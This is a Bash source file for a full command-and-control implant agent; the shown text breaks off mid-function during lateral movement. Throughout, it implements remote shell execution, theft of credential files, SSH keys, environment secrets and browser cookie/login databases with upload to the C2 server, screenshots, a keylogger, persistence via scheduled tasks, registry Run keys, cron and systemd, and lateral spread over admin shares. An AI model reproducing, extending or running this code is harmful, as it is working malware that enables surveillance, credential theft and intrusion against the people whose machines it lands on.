#!/usr/bin/env bash
# agent.sh — C2 agent, Bash port.
# Requires: curl and jq (or python3 for JSON parsing).
#
# Usage:
#   ./agent.sh --server http://127.0.0.1:8000 --token <AGENT_TOKEN> [--interval 10] [--verbose]
#   # or via env vars: C2_SERVER, C2_TOKEN, C2_INTERVAL
#
# Only use against systems you own or are authorized to test.

set -u

SERVER="${C2_SERVER:-}"
TOKEN="${C2_TOKEN:-}"
INTERVAL="${C2_INTERVAL:-10}"
JITTER="${C2_JITTER:-0}"
VERBOSE="${C2_VERBOSE:-0}"
STATE_FILE="${HOME}/.c2agent.json"
C2_STATE_FILE="${C2_STATE_FILE:-}"

# ---------------------------------------------------------------- helpers

log() {
  if [ "$VERBOSE" = "1" ]; then echo "[*] $*"; fi
}

DBG="${C2_DBG:-0}"
dbg() {
  [ "$DBG" = "1" ] && echo "[dbg] $*" >&2
}

die() {
  echo "error: $*" >&2
  exit 1
}

command -v curl >/dev/null 2>&1 || die "curl is required"
if command -v jq >/dev/null 2>&1; then
  json_get() { jq -r "${1:?path}"; }
elif command -v python3 >/dev/null 2>&1; then
  json_get() {
    python3 -c '
import sys, json
try:
    d = json.load(sys.stdin)
except Exception:
    sys.exit(0)
p = sys.argv[1]
cur = d
for pt in p.split("."):
    pt = pt.strip()
    if not pt:
        continue
    if pt.startswith("[") and pt.endswith("]"):
        cur = cur[pt[1:-1].strip(chr(34))]
    elif " // " in pt:
        key, default = pt.split(" // ", 1)
        key = key.strip().strip(chr(34))
        try:
            cur = cur[key]
        except (KeyError, TypeError):
            cur = default.strip()
    else:
        cur = cur[pt]
print(json.dumps(cur) if isinstance(cur, (dict, list)) else (cur if cur is not None else ""))' "$1"
  }
else
  die "jq or python3 is required for JSON parsing"
fi

# Build a JSON object from KEY=VALUE... args using whichever parser exists.
json_obj() {
  if command -v jq >/dev/null 2>&1; then
    local args=() f="{}" k v
    for kv in "$@"; do
      k="${kv%%=*}"; v="${kv#*=}"
      if [[ "$v" =~ ^[0-9]+$ ]]; then
        args+=(--argjson "$k" "$v")
      else
        args+=(--arg "$k" "$v")
      fi
      f="$f + {$k: \$$k}"
    done
    jq -nc "${args[@]}" "$f"
  else
    python3 - "$@" <<'PY'
import json, sys
d = {}
for kv in sys.argv[1:]:
    k, _, v = kv.partition("=")
    d[k] = v
print(json.dumps(d))
PY
  fi
}

load_id() {
  if [ -f "$STATE_FILE" ]; then
    AGENT_ID=$(cat "$STATE_FILE" | json_get '.agent_id' 2>/dev/null || echo "")
  else
    AGENT_ID=""
  fi
}

save_id() {
  printf '{"agent_id":"%s"}\n' "$AGENT_ID" > "$STATE_FILE"
  chmod 600 "$STATE_FILE"
}

local_ip() {
  # best-effort: try multiple methods to get local IP
  # method 1: ip route (Linux)
  if command -v ip >/dev/null 2>&1; then
    ip route get 1.1.1.1 2>/dev/null | awk '/src/ {print $7; exit}'
    return
  fi
  # method 2: hostname -I (most Linux)
  if command -v hostname >/dev/null 2>&1; then
    hostname -I 2>/dev/null | awk '{print $1; exit}'
    return
  fi
  # method 3: ifconfig (macOS/BSD)
  if command -v ifconfig >/dev/null 2>&1; then
    ifconfig 2>/dev/null | awk '/inet / && $2 !~ /^127\./ {split($2,a,":"); print a[2]; exit}'
    return
  fi
  # method 4: /proc/net fallback (Linux containers)
  if [ -f /proc/net/route ]; then
    awk '/^eth0/ {print $10}' /proc/net/route 2>/dev/null | head -1
    return
  fi
  echo ""
}

post_json() {
  # $1 = path, $2 = json body -> prints "CODE BODY"
  local out code
  out=$(curl -s -w $'\n%{http_code}' -X POST "$SERVER$1" \
        -H "X-Agent-Token: $TOKEN" -H "Content-Type: application/json" \
        -d "$2" --max-time 15)
  code=$(echo "$out" | tail -n1)
  printf '%s %s' "$code" "$(echo "$out" | head -n -1)"
}

# ------------------------------------------------------------- lifecycle

register() {
  local body rc_resp rc resp ip
  ip=$(local_ip)
  body=$(json_obj \
    "agent_id=$AGENT_ID" \
    "hostname=$(hostname 2>/dev/null || uname -n 2>/dev/null || echo unknown)" \
    "username=$(id -un 2>/dev/null || echo ${USER:-unknown})" \
    "os=$(uname -s 2>/dev/null | tr '[:upper:]' '[:lower:]' | awk '{ if ($0 ~ /mingw|msys|cygwin/) print "windows"; else if ($0 ~ /darwin/) print "macos"; else if ($0 ~ /linux/) print "linux"; else print $0 }')" \
    "arch=$(uname -m 2>/dev/null || echo unknown)" \
    "pid=$$" \
    "ip=$ip" \
    "version=1.0" \
    "type=bash")
  rc_resp=$(post_json "/api/register" "$body")
  rc="${rc_resp%% *}"
  resp="${rc_resp#* }"
  dbg "register resp=[$resp] rc=$rc"
  [ "$rc" = "200" ] || { log "register failed: HTTP $rc ($resp) — will retry on next checkin"; return 1; }
  AGENT_ID=$(echo "$resp" | json_get '.agent_id')
  save_id
  log "registered as $AGENT_ID"
}

checkin() {
  local rc_resp rc body tasks
  rc_resp=$(post_json "/api/checkin" "{\"agent_id\":\"$AGENT_ID\"}")
  rc="${rc_resp%% *}"
  dbg "checkin rc=$rc body=${rc_resp#* }"
  if [ "$rc" = "404" ]; then
    log "server does not know us — re-registering"
    register
    echo ""
    return
  fi
  [ "$rc" = "200" ] || { log "checkin failed: HTTP $rc"; echo ""; return; }
  body="${rc_resp#* }"
  tasks=$(echo "$body" | json_get '.tasks')
  echo "$tasks"
  dbg "tasks=[$tasks]"
}

report() {
  # $1 = task_id, $2 = output, $3 = exit_code, $4 = error
  local body
  body=$(json_obj \
    "agent_id=$AGENT_ID" \
    "task_id=$1" \
    "output=$2" \
    "exit_code=$3" \
    "error=$4")
  post_json "/api/result" "$body" >/dev/null
}

# ---------------------------------------------------------------- tasks

RUN_CODE=0

run_shell() {
  # $1 = command, $2 = timeout seconds (default 120) -> prints output; sets RUN_CODE
  local timeout="${2:-120}" out tmp pid waited
  if command -v timeout >/dev/null 2>&1; then
    # GNU coreutils timeout(1); returns 124 when it kills the command.
    # PIPESTATUS[0] keeps timeout's code instead of tail's.
    out=$(timeout "$timeout" sh -c "$1" 2>&1 | tail -c 12000)
    RUN_CODE=${PIPESTATUS[0]}
  else
    tmp=$(mktemp)
    sh -c "$1" >"$tmp" 2>&1 &
    pid=$!
    waited=0
    while kill -0 "$pid" 2>/dev/null; do
      sleep 1
      waited=$((waited + 1))
      if [ "$waited" -ge "$timeout" ]; then
        kill -9 "$pid" 2>/dev/null
        wait "$pid" 2>/dev/null
        RUN_CODE=124
        out=$(tail -c 12000 "$tmp")
        rm -f "$tmp"
        echo "$out"
        return 0
      fi
    done
    wait "$pid" 2>/dev/null
    RUN_CODE=$?
    out=$(tail -c 12000 "$tmp")
    rm -f "$tmp"
  fi
  echo "$out"
}

download() {
  # $1 = task_id, $2 = filename, $3 = destination (optional)
  local name="${2:-payload.bin}" dest="${3:-$name}"
  case "$dest" in */) dest="${dest%/}/$(basename "$name")";; esac
  if [ -d "$dest" ]; then dest="$dest/$(basename "$name")"; fi
  mkdir -p "$(dirname "$dest")" 2>/dev/null
  if curl -s -f -H "X-Agent-Token: $TOKEN" "$SERVER/api/files/$1" -o "$dest" --max-time 120; then
    echo "saved $(stat -c%s "$dest" 2>/dev/null || stat -f%z "$dest" 2>/dev/null) bytes to $dest"
  else
    echo "download failed"
    return 1
  fi
}

upload() {
  # $1 = task_id, $2 = path
  if [ -f "$2" ]; then
    if curl -s -f -H "X-Agent-Token: $TOKEN" -F "file=@$2" "$SERVER/api/files/$1" --max-time 300 >/dev/null; then
      echo "uploaded $2"
    else
      echo "upload failed"
      return 1
    fi
  else
    echo "file not found: $2"
    return 1
  fi
}

# ---------------------------------------------------------------- clone
# Cross-agent resurrection watchdog. Monitors a target agent via the
# server; if the target is dead/stale, runs a relaunch command.

CLONE_DIR() { echo "${TMPDIR:-/tmp}/.c2clone_${AGENT_ID:-unknown}"; }

clone_action() {
  # $1 = action (start|stop|status), $2 = args json
  local action="${1:-start}" args="$2"
  local target command interval
  target=$(echo "$args" | json_get '.target // ""')
  [ -z "$target" ] && target="$AGENT_ID"
  command=$(echo "$args" | json_get '.command // ""')
  interval=$(echo "$args" | json_get '.interval // 30')
  case "$interval" in *[!0-9]*) interval=30 ;; esac
  [ "$interval" -ge 5 ]  || interval=5
  [ "$interval" -le 3600 ] || interval=3600

  local wdir="$(CLONE_DIR)/$target"
  mkdir -p "$(CLONE_DIR)" 2>/dev/null

  case "$action" in
    stop)
      local pidf="$wdir/pid"
      if [ ! -f "$pidf" ]; then
        echo "clone: no watcher for $target"; return 1
      fi
      local wpid
      wpid=$(cat "$pidf")
      if [ -n "$wpid" ]; then
        kill "$wpid" 2>/dev/null; wait "$wpid" 2>/dev/null
      fi
      rm -rf "$wdir"
      echo "clone: watcher for $target stopped"; return 0
      ;;
    status)
      if [ ! -d "$(CLONE_DIR)" ] || [ -z "$(ls -A "$(CLONE_DIR)" 2>/dev/null)" ]; then
        echo "clone: no watchers running"; return 0
      fi
      local lines=""
      for d in "$(CLONE_DIR)"/*/; do
        [ -d "$d" ] || continue
        local t
        t=$(basename "$d")
        local st last rel cmd
        st=$(cat "$d/status" 2>/dev/null || echo "?")
        last=$(cat "$d/last_check" 2>/dev/null || echo "?")
        rel=$(cat "$d/relaunches" 2>/dev/null || echo "0")
        cmd=$(cat "$d/command" 2>/dev/null || echo "(none)")
        lines="${lines}  ${t}: ${st} | last_check ${last} | relaunched ${rel}x | cmd: ${cmd}"$'\n'
      done
      printf 'clone watchers:\n%s' "$lines"
      return 0
      ;;
    start)
      if [ -f "$wdir/pid" ] && [ -n "$(cat "$wdir/pid" 2>/dev/null)" ]; then
        echo "clone: watcher for $target already running"; return 1
      fi
      if [ -z "$command" ]; then
        echo "clone: 'command' (relaunch cmd) required"; return 1
      fi
      mkdir -p "$wdir"
      echo "$command"    > "$wdir/command"
      echo "$interval"   > "$wdir/interval"
      echo "starting"    > "$wdir/status"
      echo "never"       > "$wdir/last_check"
      echo "0"           > "$wdir/relaunches"
      # launch background watcher (JSON parse helper inlined so the
      # detached process doesn't depend on parent shell functions)
      nohup sh -c "
        wdir=\"$wdir\"
        target=\"$target\"
        command=\"$command\"
        interval=$interval
        server=\"$SERVER\"
        token=\"$TOKEN\"
        parset() {
          sed -n \"s/.*\\\"\$1\\\"[[:space:]]*:[[:space:]]*\\\"\\?//p\" |
            sed 's/\".*//'
        }
        echo \$\$ > \"\$wdir/pid\"
        while true; do
          now=\$(date -u '+%Y-%m-%d %H:%M:%S' 2>/dev/null || date '+%Y-%m-%d %H:%M:%S')
          resp=\$(curl -s -w \$'\n%{http_code}' -H \"X-Agent-Token: \$token\" \
            \"\$server/api/clone/status/\$target\" --max-time 15 2>/dev/null)
          rc=\$?
          if [ \$rc -ne 0 ]; then
            echo 'error' > \"\$wdir/status\"
            echo \"\$now\" > \"\$wdir/last_check\"
          else
            hcode=\$(echo \"\$resp\" | tail -n1)
            body=\$(echo \"\$resp\" | sed '\$d')
            if [ \"\$hcode\" = '404' ]; then
              echo 'unknown' > \"\$wdir/status\"
              echo 'target gone' > \"\$wdir/last_check\"
            elif [ \"\$hcode\" = '200' ]; then
              st=\$(echo \"\$body\" | parset status)
              [ -z \"\$st\" ] && st=unknown
              echo \"\$st\" > \"\$wdir/status\"
              echo \"\$now\" > \"\$wdir/last_check\"
              if [ \"\$st\" = 'dead' ] || [ \"\$st\" = 'stale' ]; then
                if [ -n \"\$command\" ]; then
                  rel=\$(cat \"\$wdir/relaunches\" 2>/dev/null || echo 0)
                  rel=\$(( rel + 1 ))
                  echo \"\$rel\" > \"\$wdir/relaunches\"
                  nohup sh -c \"\$command\" >/dev/null 2>&1 &
                fi
              fi
            else
              echo \"http \$hcode\" > \"\$wdir/status\"
              echo \"\$now\" > \"\$wdir/last_check\"
            fi
          fi
          sleep \"\$interval\"
        done
      " >/dev/null 2>&1 &
      # give the child a moment to write its pid
      sleep 0.2
      local wpid
      wpid=$(cat "$wdir/pid" 2>/dev/null || echo "")
      if [ -z "$wpid" ]; then
        rm -rf "$wdir"
        echo "clone: failed to start watcher"; return 1
      fi
      echo "clone: watcher started on target ${target} (every ${interval}s, restart cmd: ${command})"
      return 0
      ;;
    *)
      echo "clone: unknown action: $action"; return 1
      ;;
  esac
}

# ---------------------------------------------------------------- steal
# Collect env vars, token files, and raw browser DBs. Zip and upload.

steal_env() {
  # $1 = output dir -> prints collected filenames (one per line)
  local outdir="$1"
  local kw="token secret password passwd key= api auth aws azure google github gitlab slack discord cookie session credential access proxy login"
  local lines=""
  while IFS='=' read -r k v; do
    [ -z "$k" ] && continue
    local lk
    lk=$(echo "$k" | tr '[:upper:]' '[:lower:]')
    local hit=0
    for w in $kw; do
      case "$lk" in *$w*) hit=1; break ;; esac
    done
    if [ "$hit" = "1" ]; then
      lines="${lines}${k}=${v}"$'\n'
    fi
  done < <(env 2>/dev/null)
  if [ -z "$lines" ]; then return 0; fi
  printf '%s' "$lines" | sort > "$outdir/env.txt"
  echo "env.txt"
}

steal_tokens() {
  # $1 = output dir -> prints collected filenames
  local outdir="$1" home="$HOME"
  local files=".aws/credentials .aws/config .git-credentials .netrc .npmrc .pypirc .pip/pip.conf .config/pip/pip.conf .config/gh/hosts.yml .config/rclone/rclone.conf .config/gcloud/credentials.json .config/gcloud/access_tokens.db .docker/config.json .kube/config .ssh/id_rsa .ssh/id_ed25519 .ssh/id_ecdsa .ssh/config .ssh/known_hosts .ssh/authorized_keys"
  mkdir -p "$outdir/tokens" 2>/dev/null
  for rel in $files; do
    local src="$home/$rel"
    if [ -f "$src" ]; then
      local sz
      sz=$(stat -c%s "$src" 2>/dev/null || stat -f%z "$src" 2>/dev/null || echo "0")
      if [ "$sz" -le 8388608 ] 2>/dev/null; then
        cp -p "$src" "$outdir/tokens/$(basename "$rel")" 2>/dev/null && echo "tokens/$(basename "$rel")"
      fi
    fi
  done
}

steal_browser() {
  # $1 = output dir -> prints collected filenames
  local outdir="$1" home="$HOME" hits=""
  local macbase="$home/Library/Application Support"

  _scan_chromium() {
    local root="$1"
    while IFS= read -r -d '' dirpath; do
      for fn in "Login Data" "Cookies" "Web Data"; do
        if [ -f "$dirpath/$fn" ]; then
          local rel="${dirpath#"$root"/}"
          local dst="$outdir/browser/chromium/${rel//\//__}"
          mkdir -p "$dst" 2>/dev/null
          cp -p "$dirpath/$fn" "$dst/$fn" 2>/dev/null && hits="$hits browser/chromium/${rel//\//__}/$fn"
        fi
      done
    done < <(find "$root" -type d -print0 2>/dev/null)
  }

  _scan_firefox() {
    local ffroot="$1"
    while IFS= read -r -d '' dirpath; do
      for fn in "cookies.sqlite" "logins.json" "key4.db" "cert9.db"; do
        if [ -f "$dirpath/$fn" ]; then
          local rel="${dirpath#"$ffroot"/}"
          local dst="$outdir/browser/firefox/${rel//\//__}"
          mkdir -p "$dst" 2>/dev/null
          cp -p "$dirpath/$fn" "$dst/$fn" 2>/dev/null && hits="$hits browser/firefox/${rel//\//__}/$fn"
        fi
      done
    done < <(find "$ffroot" -type d -print0 2>/dev/null)
  }

  # chromium: Linux, macOS, Windows (Git Bash / MSYS)
  for d in "$home/.config/google-chrome" "$home/.config/chromium" \
           "$home/.config/microsoft-edge" "$home/.config/msedge" \
           "$home/.config/brave-browser" "$home/.config/opera" \
           "$macbase/Google/Chrome" "$macbase/Microsoft Edge" \
           "$macbase/BraveSoftware/Brave-Browser"; do
    [ -d "$d" ] && _scan_chromium "$d"
  done
  if [ -n "${LOCALAPPDATA:-}" ]; then
    for d in "$LOCALAPPDATA/Google/Chrome/User Data" \
             "$LOCALAPPDATA/Microsoft/Edge/User Data" \
             "$LOCALAPPDATA/BraveSoftware/Brave-Browser/User Data" \
             "$LOCALAPPDATA/Opera Software/Opera Stable"; do
      [ -d "$d" ] && _scan_chromium "$d"
    done
  fi

  # firefox: Linux, macOS, Windows
  for d in "$home/.mozilla/firefox" "$macbase/Firefox/Profiles"; do
    [ -d "$d" ] && _scan_firefox "$d"
  done
  if [ -n "${APPDATA:-}" ] && [ -d "$APPDATA/Mozilla/Firefox/Profiles" ]; then
    _scan_firefox "$APPDATA/Mozilla/Firefox/Profiles"
  fi

  unset -f _scan_chromium _scan_firefox
  echo "$hits"
}

steal_task() {
  # $1 = task_id, $2 = args json
  local tid="$1" args="$2"
  local profile
  profile=$(echo "$args" | json_get '.profile // "all"')
  case "$profile" in all|env|tokens|browser) ;; *) profile=all ;; esac
  local work
  work=$(mktemp -d "${TMPDIR:-/tmp}/c2steal.XXXXXX" 2>/dev/null || echo "/tmp/c2steal_$$")
  [ -d "$work" ] || work=$(mktemp -d 2>/dev/null || { mkdir -p "/tmp/c2steal_$$" && echo "/tmp/c2steal_$$"; })
  local manifest=""
  if [ "$profile" = "all" ] || [ "$profile" = "env" ]; then
    local m
    m=$(steal_env "$work")
    [ -n "$m" ] && manifest="$manifest $m"
  fi
  if [ "$profile" = "all" ] || [ "$profile" = "tokens" ]; then
    local m
    m=$(steal_tokens "$work")
    [ -n "$m" ] && manifest="$manifest $m"
  fi
  if [ "$profile" = "all" ] || [ "$profile" = "browser" ]; then
    local m
    m=$(steal_browser "$work")
    [ -n "$m" ] && manifest="$manifest $m"
  fi
  manifest=$(echo "$manifest" | xargs)  # trim whitespace
  if [ -z "$manifest" ]; then
    rm -rf "$work"
    echo "steal ($profile): nothing found"; return 1
  fi
  # write manifest
  printf '%s\n' "$manifest" | sort > "$work/manifest.txt"
  # zip or tar
  local archive="$work/steal.zip"
  if command -v zip >/dev/null 2>&1; then
    (cd "$work" && zip -q -r "$archive" . -x 'steal.zip') 2>/dev/null
  else
    tar -czf "$archive" -C "$work" . 2>/dev/null
    # server expects .zip but content is tar.gz; rename for clarity
    archive="$work/steal.tgz"
  fi
  if [ ! -f "$archive" ]; then
    rm -rf "$work"
    echo "steal: failed to create archive"; return 1
  fi
  local sz
  sz=$(stat -c%s "$archive" 2>/dev/null || stat -f%z "$archive" 2>/dev/null || echo "?")
  if curl -s -f -H "X-Agent-Token: $TOKEN" \
       -F "file=@$archive" \
       "$SERVER/api/files/$tid" --max-time 300 >/dev/null; then
    local count
    count=$(echo "$manifest" | wc -w)
    echo "stole ${count} item(s) -> $(basename "$archive") (${sz} bytes)"$'\n'"$manifest"
  else
    rm -rf "$work"
    echo "steal: upload failed"; return 1
  fi
  rm -rf "$work"
}

screenshot() {
  # $1 = task_id, $2 = label (optional)
  local tid="$1" label="${2:-screenshot}" tmp
  if command -v mktemp >/dev/null 2>&1; then
    tmp=$(mktemp "${TMPDIR:-/tmp}/c2shot.XXXXXX.png")
  else
    tmp="/tmp/c2shot_$$.png"
  fi
  local ok=0
  if command -v screencapture >/dev/null 2>&1; then
    screencapture -x "$tmp" 2>/dev/null && ok=1
  elif command -v import >/dev/null 2>&1; then
    import -window root "$tmp" 2>/dev/null && ok=1
  elif command -v scrot >/dev/null 2>&1; then
    scrot "$tmp" 2>/dev/null && ok=1
  elif command -v gnome-screenshot >/dev/null 2>&1; then
    gnome-screenshot -f "$tmp" 2>/dev/null && ok=1
  fi
  if [ "$ok" = "0" ] || [ ! -s "$tmp" ]; then
    echo "error: no screenshot tool available (screencapture/import/scrot/gnome-screenshot)"
    rm -f "$tmp"
    return 1
  fi
  if curl -s -f -H "X-Agent-Token: $TOKEN" -F "file=@$tmp;filename=${label}.png" "$SERVER/api/files/$tid" --max-time 120 >/dev/null; then
    echo "screenshot saved (${label}.png)"
  else
    echo "screenshot upload failed"
    ok=0
  fi
  rm -f "$tmp"
  [ "$ok" = "1" ]
}

# ---------------------------------------------------------------- keylog
# File-based keystroke logger. 'start' spawns a background collector
# (PowerShell GetAsyncKeyState on Windows, xinput->awk on Linux) that appends
# to a log file; 'dump' stops the collector and returns the captured text.

klog_base() { echo "${TMPDIR:-/tmp}/.c2keylog_${AGENT_ID}"; }

proc_alive() {
  [ -n "${1:-}" ] || return 1
  if command -v tasklist >/dev/null 2>&1; then
    tasklist /FI "PID eq $1" 2>/dev/null | grep -q "$1"
  else
    kill -0 "$1" 2>/dev/null
  fi
}

klog_write() {
  local base="$1"
  cat > "$base.ps" <<'PS'
$C2P = $env:C2P; $C2K = $env:C2K
[IO.File]::WriteAllText($C2P, [string]$PID)
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);[DllImport("user32.dll")]public static extern short GetKeyState(int v);}'
$l = New-Object 'bool[]' 256
while (1) {
  Start-Sleep -Milliseconds 25
  for ($v = 8; $v -le 190; $v++) {
    $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)
    if ($d -ne $l[$v]) {
      if ($d) {
        $c = $null
        if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }
        elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }
        elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }
        elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }
        elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }
        elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }
        elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }
        elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }
        elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }
        elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }
        elseif ($v -eq 192) { $c = '`' } elseif ($v -eq 219) { $c = '[' }
        elseif ($v -eq 220) { $c = '\' } elseif ($v -eq 221) { $c = ']' }
        elseif ($v -eq 222) { $c = "'" }
        if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) }
      }
      $l[$v] = $d
    }
  }
}
PS
  cat > "$base.sh" <<'SH'
#!/bin/sh
C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
echo $$ > "$C2P"
kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
[ -z "$kid" ] && exit 1
xinput test "$kid" 2>/dev/null | awk -v p="$C2K" '
BEGIN { n = split("2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50", a, " "); s = "1234567890qwertyuiopasdfghjklzxcvbnm"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) }
{ if ($1 == "key" && $2 == "press") { c = m[$3]; if ($3 == 57) c = " "; else if ($3 == 28) c = "\n"; else if ($3 == 15) c = "[TAB]"; else if ($3 == 14) c = "[BACKSPACE]"; else if ($3 == 1) c = "[ESC]"; else if ($3 == 111) c = "[DEL]"; else if ($3 == 42 || $3 == 54) c = "[SHIFT]"; else if ($3 == 29 || $3 == 97) c = "[CTRL]"; else if ($3 == 56 || $3 == 100) c = "[ALT]"; if (c != "") printf "%s", c > p } }'
SH
}

klog_start() {
  local base pidf logf osname i
  base=$(klog_base); pidf="$base.pid"; logf="$base.log"
  if [ -f "$pidf" ] && proc_alive "$(cat "$pidf")"; then
    echo "keylogger already running"; return 0
  fi
  klog_write "$base"
  rm -f "$logf"
  osname=$(uname -s 2>/dev/null)
  case "$osname" in
    *MINGW*|*MSYS*|*CYGWIN*|*NT-*)
      C2P="$pidf" C2K="$logf" powershell -NoProfile -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','$base.ps'" >/dev/null 2>&1
      ;;
    Darwin)
      echo "error: keylogger not supported on macOS"; return 1
      ;;
    *)
      C2P="$pidf" C2K="$logf" nohup sh "$base.sh" >/dev/null 2>&1 &
      ;;
  esac
  i=0
  while [ $i -lt 25 ] && [ ! -f "$pidf" ]; do sleep 0.1; i=$((i + 1)); done
  if [ ! -f "$pidf" ]; then echo "error: no keylogging tool available (powershell/xinput needed)"; return 1; fi
  echo "keylogger started"
}

klog_stop() {
  local base pidf pid
  base=$(klog_base); pidf="$base.pid"
  [ -f "$pidf" ] || { echo "keylogger not running"; return 0; }
  pid=$(cat "$pidf")
  if proc_alive "$pid"; then
    if command -v taskkill >/dev/null 2>&1; then
      taskkill /PID "$pid" /F /T >/dev/null 2>&1
    else
      kill "$pid" >/dev/null 2>&1
    fi
  fi
  rm -f "$pidf"
  echo "keylogger stopped"
}

klog_dump() {
  local out
  out=$(klog_stop)
  case "$out" in
    keylogger\ stopped|keylogger\ not\ running) : ;;
    *) echo "$out"; return 1 ;;
  esac
  if [ -s "$(klog_base).log" ]; then
    tail -c 8000 "$(klog_base).log"
  else
    echo "(no keystrokes recorded)"
  fi
}

# -------------------------------------------------------------- persistence
# Copy self to a persistent path and register a logon/reboot hook that
# relaunches with the same server/token/interval/jitter.

PERSIST_RC=0
persistence_task() {
  # $1 = args json (unused) -> prints output; sets PERSIST_RC
  local args="$1"
  local srv="${SERVER%/}" tok="${TOKEN}" iv="${INTERVAL:-10}" jt="${JITTER:-0}"
  local interp="${BASH:-bash}"
  local osname dest destdir cmd out replies unit cronout sctl progdata wrapper
  local cr_ok=0 sys_ok=0
  osname=$(uname -s 2>/dev/null | tr '[:upper:]' '[:lower:]')
  PERSIST_RC=0
  case "$osname" in
    *mingw*|*msys*|*cygwin*|*nt-*)
      destdir="${APPDATA:-${HOME:-.}}/Microsoft/Windows/c2update"
      dest="$destdir/c2agent.sh"
      mkdir -p "$destdir" 2>/dev/null
      cp -f "$0" "$dest" 2>/dev/null
      cmd="$interp \"$dest\" --server \"$srv\" --token \"$tok\" --interval \"$iv\" --jitter \"$jt\""
      progdata="${ProgramData:-${ALLUSERSPROFILE:-C:\ProgramData}}"
      wrapper="$progdata/c2update/c2relaunch.cmd"
      mkdir -p "$progdata/c2update" 2>/dev/null
      cat > "$wrapper" <<EOF
@echo off
start "" /b $cmd
EOF
      sed -i 's/$/\r/' "$wrapper" 2>/dev/null
      out="persistence: copied self to $dest"$'\n'"persistence: wrote launcher $wrapper"
      if schtasks /Create /TN "c2agent-persist" /TR "$wrapper" /SC ONLOGON /RL HIGHEST /F >/dev/null 2>&1; then
        out="$out"$'\n'"schtasks: scheduled ONLOGON (c2agent-persist)"
      elif reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v c2agent /t REG_SZ /d "$wrapper" /f >/dev/null 2>&1; then
        out="$out"$'\n'"reg: HKCU Run key set (c2agent)"
      else
        PERSIST_RC=1
        out="$out"$'\n'"persistence: failed — schtasks and reg add both failed"
      fi
      ;;
    *)
      destdir="${HOME:-.}/.config/c2update"
      dest="$destdir/$(basename "$0")"
      mkdir -p "$destdir" 2>/dev/null
      cp -f "$0" "$dest" 2>/dev/null
      cmd="$interp \"$dest\" --server \"$srv\" --token \"$tok\" --interval \"$iv\" --jitter \"$jt\""
      cronout=$( (crontab -l 2>/dev/null | grep -v 'c2agent-persist'; printf '@reboot %s # c2agent-persist\n' "$cmd") | crontab - 2>&1 )
      [ -z "$cronout" ] && cr_ok=1
      unit="$destdir/c2-update.service"
      printf '[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c "%s"\nRestart=always\n\n[Install]\nWantedBy=default.target\n' "$cmd" > "$unit" 2>/dev/null
      sctl=""
      if command -v systemctl >/dev/null 2>&1; then
        sctl=$(systemctl --user daemon-reload 2>&1; systemctl --user enable --now c2-update.service 2>&1)
        local sctlrc=$?
        [ "$sctlrc" = "0" ] && sys_ok=1
      else
        sctl="systemctl: unavailable"
      fi
      replies="${cronout:-crontab: @reboot hook installed (c2agent-persist)}"
      [ -n "$sctl" ] && replies="$replies"$'\n'"$sctl"
      if [ "$cr_ok" = "1" ] || [ "$sys_ok" = "1" ]; then
        out="persistence: copied self to $dest"$'\n'"$replies"
      else
        PERSIST_RC=1
        out="persistence: failed — crontab and systemd user unit both failed"$'\n'"$replies"
      fi
      ;;
  esac
  [ "${#out}" -gt 12000 ] && out=$(printf '%s' "$out" | tail -c 12000)
  echo "$out"
  return "$PERSIST_RC"
}

# ---------------------------------------------------------------- lateral
# LAN lateral movement: discover local peers, then deploy and launch this
# same agent on each using shared credentials.

lateral_discover() {
  # $1 = base prefix "a.b.c", $2 = own ip -> prints peer ips (sorted, capped)
  local base="$1" own="$2" out
  out=$( { arp -a 2>/dev/null; command -v ip >/dev/null 2>&1 && ip neigh 2>/dev/null; } )
  [ -z "$out" ] && return
  echo "$out" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' \
    | grep "^${base}\." | grep -v "^${own}$" | sort -u | head -30
}

lateral_win_deploy() {
  # $1 = host, $2 = user, $3 = pass -> prints status
  local host="$1" user="$2" pass="$3"
  local base self nout nrc cout crc terr trc
  base=$(basename "$0"); self="$0"
  nout=$(net use "\\\\$host\\admin\$" /user:"$user" "$pass" 2>&1); nrc=$?
  if [ "$nrc" -ne 0 ]; then
    echo "failed (net use: $nout)"
    return 1
  fi
  cout=$(cmd /c "copy /y \"$self\" \"\\\\$host\\admin\$\\$base\"" 2>&1); crc=$?
  if [ "$crc" -ne 0 ]; then
    echo "failed (copy: $cout)"
    net use "\\\\$host\\admin\$" /delete /y >/dev/null 2>&1
    return 1
  fi
  terr=$(schtasks /Create /S "$host" /TN "c2agent-lateral" /TR "\\\\$host\\admin\$\\$base" /SC ONLOGON /RU "$user" /RP "$pass" /RL HIGHEST /F 2>&1); trc=$?
